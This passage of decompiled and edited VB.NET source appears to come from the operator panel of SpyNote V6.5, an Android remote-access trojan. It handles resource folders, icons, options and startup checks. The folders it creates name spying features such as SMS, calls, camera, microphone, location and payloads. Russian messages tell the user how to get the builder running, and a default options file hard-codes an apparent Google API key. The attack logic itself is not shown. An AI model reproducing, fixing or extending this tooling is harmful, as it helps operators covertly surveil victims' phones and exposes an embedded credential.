                result = New String() {"n/a", "n/a", "n/a", "n/a", "n/a", "n/a", "n/a", "n/a"}
            End Try
            Return result
        End Function

        Private Function GetPrimaryNic() As Integer
            Dim num As Integer = Store.ListNetworkInterface.Count - 1
            Dim result As Integer
            For i As Integer = 0 To num
                Try
                    Dim enumerator As IEnumerator(Of GatewayIPAddressInformation) = Store.ListNetworkInterface(i).GetIPProperties().GatewayAddresses.GetEnumerator()
                    While enumerator.MoveNext()
                        Dim current As GatewayIPAddressInformation = enumerator.Current
                        Dim flag As Boolean = Operators.CompareString(current.Address.ToString(), "0.0.0.0", False) <> 0 And Operators.CompareString(Store.ListNetworkInterface(i).OperationalStatus.ToString(), "Up", False) = 0
                        If flag Then
                            result = i
                            Return result
                        End If
                    End While
                Finally
                End Try
            Next
            result = -1
            Return result
        End Function

        Public Function ThreadsCount() As String
            Dim result As String
            Try
                Dim text As String = Process.GetCurrentProcess().Threads.Count.ToString()
                result = text.ToString()
            Catch expr_23 As Exception
                ProjectData.SetProjectError(expr_23)
                result = "n/a"
                ProjectData.ClearProjectError()
            End Try
            Return result
        End Function

        Public Function GetStartTime() As String
            Dim result As String
            Try
                Thread.CurrentThread.CurrentCulture = New CultureInfo("en-US")
                Dim text As String = Process.GetCurrentProcess().StartTime.ToString("dd/MM/yyyy hh:mm:ss tt")
                result = text.ToString()
            Catch expr_38 As Exception
                ProjectData.SetProjectError(expr_38)
                result = "n/a"
                ProjectData.ClearProjectError()
            End Try
            Return result
        End Function

        Public Sub StartThread_0()
            Store.ClassCPU.bBoolean = True
            Store.ClassCPU.StartThread()
        End Sub

        Public Sub StopThread_0()
            Store.ClassCPU.bBoolean = False
            Store.ClassCPU.Threading_0.Abort()
        End Sub

        Private _placeholderBitmap As Bitmap

        Private Function FindResourcesSeedFolder() As String
            Dim current As DirectoryInfo = New DirectoryInfo(Application.StartupPath)
            For level As Integer = 0 To 6
                If current Is Nothing Then
                    Exit For
                End If

                For Each child As DirectoryInfo In current.GetDirectories()
                    Dim iconsPath As String = IO.Path.Combine(child.FullName, "Icons")
                    Dim importsPath As String = IO.Path.Combine(child.FullName, "Imports")
                    If Directory.Exists(iconsPath) AndAlso Directory.Exists(importsPath) Then
                        Dim targetResources As String = IO.Path.GetFullPath(Store.Resources(1))
                        If Not String.Equals(IO.Path.GetFullPath(child.FullName), targetResources, StringComparison.OrdinalIgnoreCase) Then
                            Return child.FullName
                        End If
                    End If
                Next

                current = current.Parent
            Next

            Return Nothing
        End Function

        Private Sub CopyMissingSeedFiles(seedRoot As String, targetRoot As String)
            If Not Directory.Exists(seedRoot) Then
                Return
            End If

            For Each sourceFile As String In Directory.GetFiles(seedRoot, "*.*", SearchOption.AllDirectories)
                Dim relativePath As String = sourceFile.Substring(seedRoot.Length).TrimStart("\"c, "/"c)
                Dim targetFile As String = IO.Path.Combine(targetRoot, relativePath)
                Dim targetDirectory As String = IO.Path.GetDirectoryName(targetFile)
                If Not Directory.Exists(targetDirectory) Then
                    Directory.CreateDirectory(targetDirectory)
                End If

                If Not File.Exists(targetFile) Then
                    File.Copy(sourceFile, targetFile, False)
                End If
            Next
        End Sub

        Public Sub EnsureResources()
            Dim root As String = Store.Resources(1)
            If Not Directory.Exists(root) Then
                Directory.CreateDirectory(root)
            End If

            Dim seedFolder As String = Store.FindResourcesSeedFolder()
            If Not String.IsNullOrEmpty(seedFolder) Then
                Store.CopyMissingSeedFiles(seedFolder, root)
            End If

            Dim builtInResources As String = IO.Path.Combine(Application.StartupPath, "Resources")
            If Directory.Exists(builtInResources) Then
                Store.CopyMissingSeedFiles(builtInResources, root)
            End If

            Dim subDirs As String() = New String() {
                "Icons\window\win", "Icons\ToolStrip", "Icons\Flags", "Icons\FileManager",
                "Icons\CallsManager", "Icons\AccountManager", "Icons\ctx_menu", "Icons\window",
                "Icons\SMS", "Icons\Note", "Icons\NFD", "Icons\terminal", "Icons\RE", "Icons\Logo",
                "Icons\Location", "Icons\DPM", "Icons\Bar", "Icons\pinf", "Icons\FileBox",
                "Icons\Payload", "Icons\AppProperties", "Icons\Skulls", "Icons\NetworkStatus",
                "Icons\Battery", "Icons\Screen", "Icons\Chat", "Icons\Camera", "Icons\Phone",
                "Icons\Microphone", "Icons\devico", "Clients", "Audio",
                "Imports\Xml\Settings", "Imports\Payload", "Imports\GeoIP", "Imports\Gsm",
                "Imports\PlayerJava", "Imports\platform-tools", "Imports\terminal", "Imports\T"
            }

            For Each subDir As String In subDirs
                Dim path As String = IO.Path.Combine(root, subDir)
                If Not Directory.Exists(path) Then
                    Directory.CreateDirectory(path)
                End If
            Next

            Dim iconSource As String = IO.Path.Combine(Application.StartupPath, "1.ico")
            If File.Exists(iconSource) Then
                For i As Integer = 0 To 26
                    Dim iconPath As String = IO.Path.Combine(root, "Icons\window\win", i.ToString() & ".ico")
                    If Not File.Exists(iconPath) Then
                        File.Copy(iconSource, iconPath)
                    End If
                Next
            End If

            Dim projectResources As String = IO.Path.Combine(Application.StartupPath, "Resources")
            For Each filePath As String In New String() {"Circle.png", "aBitmap.dll", "ANUN.dll"}
                Dim sourceFile As String = IO.Path.Combine(projectResources, filePath)
                Dim targetFile As String = IO.Path.Combine(root, filePath)
                If File.Exists(sourceFile) AndAlso Not File.Exists(targetFile) Then
                    File.Copy(sourceFile, targetFile)
                End If
            Next

            Store.EnsureDefaultOptions()
        End Sub

        Public Sub LogStartupError(ex As Exception)
            Try
                Dim logPath As String = IO.Path.Combine(Application.StartupPath, "startup-error.log")
                File.WriteAllText(logPath, DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") & vbCrLf & ex.ToString() & vbCrLf, Encoding.UTF8)
            Catch
            End Try
        End Sub

        Public Function ValidateCriticalResources() As String
            Dim root As String = Store.Resources(1)
            Dim missing As New List(Of String)()

            If Not Directory.Exists(root) Then
                Return "Рядом с SpyNote V6.5.exe нет папки Resources." & vbCrLf &
                    "Скопируй ПОЛНУЮ папку Resources (~560 файлов) в:" & vbCrLf & Application.StartupPath
            End If

            If Not File.Exists(IO.Path.Combine(root, "Imports", "opt.inf")) Then
                missing.Add("Imports\opt.inf")
            End If
            If Not File.Exists(IO.Path.Combine(root, "Icons", "window", "win", "0.ico")) Then
                missing.Add("Icons\window\win\0.ico")
            End If

            Dim flagsDir As String = IO.Path.Combine(root, "Icons", "Flags")
            If Not Directory.Exists(flagsDir) OrElse Directory.GetFiles(flagsDir).Length = 0 Then
                missing.Add("Icons\Flags\*.png")
            End If

            If missing.Count = 0 Then
                Return String.Empty
            End If

            Return "В папке Resources не хватает файлов:" & vbCrLf &
                String.Join(vbCrLf, missing.ToArray()) & vbCrLf & vbCrLf &
                "Папка должна называться именно Resources (не Resource / Resuorce)." & vbCrLf &
                "Нужна полная папка из сборки, а не частичная копия."
        End Function

        Public Sub EnsureDefaultOptions()
            Dim optionsPath As String = IO.Path.Combine(Store.Resources(1), "Imports", "opt.inf")
            Dim optionsDirectory As String = IO.Path.GetDirectoryName(optionsPath)
            If Not Directory.Exists(optionsDirectory) Then
                Directory.CreateDirectory(optionsDirectory)
            End If

            If Not File.Exists(optionsPath) Then
                Dim defaultOptions As String = String.Join(vbCrLf, New String() {
                    "FileManager",
                    "50",
                    "50",
                    "LocationManager",
                    "AIzaSyAf2Z-9OWLi_xUuq6YM8fycVk1vZPSuRI8",
                    "Sounds",
                    "OK",
                    "-"
                })
                File.WriteAllText(optionsPath, defaultOptions, Encoding.UTF8)
            End If
        End Sub

        Public Function LoadOptionsLines() As String()
            Store.EnsureDefaultOptions()
            Dim optionsPath As String = IO.Path.Combine(Store.Resources(1), "Imports", "opt.inf")
            Dim lines As String() = File.ReadAllLines(optionsPath)
            If lines Is Nothing OrElse lines.Length < 8 Then
                Return New String() {
                    "FileManager",
                    "50",
                    "50",
                    "LocationManager",
                    "AIzaSyAf2Z-9OWLi_xUuq6YM8fycVk1vZPSuRI8",
                    "Sounds",
                    "OK",
                    "-"
                }
            End If
            Return lines
        End Function

        Public Function CircleBitmap() As Bitmap
            Try
                If My.Resources.Circle IsNot Nothing Then
                    Return My.Resources.Circle
                End If
            Catch ex As Exception
            End Try

            Dim circlePath As String = IO.Path.Combine(Store.Resources(1), "Circle.png")
            If File.Exists(circlePath) Then
                Return New Bitmap(circlePath)
            End If

            Return Store.Bitmap_0("ToolStrip\Check")
        End Function

        Public Function WindowIcon(index As Integer) As Icon
            Dim iconPath As String = IO.Path.Combine(Store.Resources(1), "Icons\window\win", index.ToString() & ".ico")
            If File.Exists(iconPath) Then
                Return New Icon(iconPath)
            End If

            Dim fallbackIcon As String = IO.Path.Combine(Application.StartupPath, "1.ico")
            If File.Exists(fallbackIcon) Then
                Return New Icon(fallbackIcon)
            End If

            Return Icon.ExtractAssociatedIcon(Application.ExecutablePath)
        End Function

        Public Function Bitmap_0(_Bitmap As String) As Bitmap
            Dim imagePath As String = Store.Resources(1) + "\Icons\" + _Bitmap + ".png"
            If File.Exists(imagePath) Then
                Return New Bitmap(imagePath)
            End If

            If Store._placeholderBitmap Is Nothing Then
                Store._placeholderBitmap = New Bitmap(16, 16)
                Using graphics As Graphics = Graphics.FromImage(Store._placeholderBitmap)
                    graphics.Clear(Color.FromArgb(63, 63, 70))
                End Using
            End If

            Return New Bitmap(Store._placeholderBitmap)
        End Function

        Public Function Image_scaling(w As Integer, h As Integer, p As String) As Bitmap
            Dim bitmap As Bitmap = New Bitmap(p)
            Dim width As Integer = w
            Dim height As Integer = h
            Dim flag As Boolean = bitmap.Width <= w
            If flag Then
                width = bitmap.Width
            End If
            Dim flag2 As Boolean = bitmap.Height <= h
            If flag2 Then
                height = bitmap.Height
            End If
            Dim bitmap2 As Bitmap = New Bitmap(width, height)
            Dim graphics As Graphics = Graphics.FromImage(bitmap2)
            graphics.InterpolationMode = InterpolationMode.Low
            graphics.DrawImage(bitmap, New Rectangle(0, 0, width, height), New Rectangle(0, 0, bitmap.Width, bitmap.Height), GraphicsUnit.Pixel)
            graphics.Dispose()
            bitmap.Dispose()
            Return bitmap2
        End Function
    End Module
End Namespace
